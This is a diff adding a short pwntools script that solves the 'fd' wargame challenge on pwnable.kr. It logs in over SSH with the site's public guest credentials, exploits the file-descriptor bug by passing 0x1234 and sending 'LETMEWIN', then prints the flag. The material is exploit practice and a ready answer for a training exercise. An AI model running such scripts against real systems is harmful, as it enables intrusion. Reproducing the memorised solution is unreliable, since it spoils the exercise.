@@ -1,0 +1,10 @@
+from pwn import *
+
+s = ssh(host='pwnable.kr', port=2222, password='guest', user='fd')
+
+p = str(0x1234)
+sh = s.process(["./fd", p])
+
+sh.sendline("LETMEWIN")
+
+print(sh.recvall().decode())
